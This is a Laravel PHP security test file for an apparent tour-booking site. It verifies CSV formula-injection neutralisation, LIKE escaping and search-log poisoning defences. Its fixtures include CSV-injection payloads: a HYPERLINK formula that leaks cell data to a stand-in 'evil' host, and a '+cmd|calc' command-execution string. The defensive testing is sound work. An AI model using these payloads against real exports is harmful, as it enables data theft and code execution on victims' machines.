<?php

namespace Tests\Feature\Security;

use App\Http\Controllers\Admin\ExportController;
use App\Models\Booking;
use App\Models\SearchLog;
use App\Models\TourRoute;
use App\Models\TourSlot;
use App\Services\SearchService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Inertia\Testing\AssertableInertia as Assert;
use Tests\TestCase;

/** M3 (CSV injection mọi cột chuỗi), L4 (thoát LIKE dùng chung), L5 (từ khóa phổ biến không bị khách vãng lai đầu độc). */
class DataLeakHardeningTest extends TestCase
{
    use RefreshDatabase;

    public function test_csv_export_neutralises_formulas_in_every_text_column(): void
    {
        $route = TourRoute::factory()->create();
        $route->translations()->where('locale', 'vi')->update(['name' => '=HYPERLINK("http://evil/?"&A2,"Mở")']);
        $slot = TourSlot::factory()->for($route, 'route')->create();
        Booking::factory()->for($slot, 'slot')->paid()->create(['contact_name' => '  +cmd|calc', 'contact_email' => '@SUM(1+1)@x.vn']);

        $csv = $this->actingAs($this->admin())->get('/vi/quan-tri/thong-ke/xuat?type=bookings')->assertOk()->streamedContent();

        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'  +cmd|calc", $csv);
        $this->assertStringContainsString("'@SUM", $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?[=+@]/m', $csv);
    }

    public function test_safe_cell_helper_covers_pipe_percent_and_leading_whitespace(): void
    {
        foreach (['=1+1', '+1', '-1', '@a', '|x', '%x', ' =x', "\t=x", "\ncmd"] as $danger) {
            $this->assertStringStartsWith("'", ExportController::safe($danger), json_encode($danger));
        }
        foreach (['Tuyến Hà Nội', 'a=b', 'BK-ABC', ''] as $ok) {
            $this->assertSame($ok, ExportController::safe($ok));
        }
    }

    public function test_like_escape_helper_escapes_backslash_percent_underscore(): void
    {
        $this->assertSame('%a\\\\b\\%c\\_d%', like_contains('a\\b%c_d'));
        $this->assertSame('x\\%', like_escape('x%'));
    }

    public function test_admin_tour_search_with_wildcards_matches_literally(): void
    {
        TourRoute::factory()->count(2)->create();

        $this->actingAs($this->admin())->get('/vi/quan-tri/tuyen-tham-quan?q=%25')->assertOk()
            ->assertInertia(fn (Assert $page) => $page->has('routes.data', 0));
        $this->actingAs($this->admin())->get('/vi/quan-tri/tuyen-tham-quan?q=%5C')->assertOk()
            ->assertInertia(fn (Assert $page) => $page->has('routes.data', 0));
    }

    public function test_popular_queries_ignore_guests_and_zero_result_queries(): void
    {
        $user = $this->member();
        $log = fn (?int $userId, string $q, int $count = 3) => SearchLog::create([
            'user_id' => $userId, 'locale' => 'vi', 'query' => $q, 'result_count' => $count, 'engine' => 'fallback', 'created_at' => now(),
        ]);
        for ($i = 0; $i < 20; $i++) {
            $log(null, 'spam-tu-khoa');
        }
        $log($user->id, 'không có', 0);
        $log($user->id, 'hoàng thành');

        $this->assertSame(['hoàng thành'], app(SearchService::class)->popularQueries('vi'));
    }
}
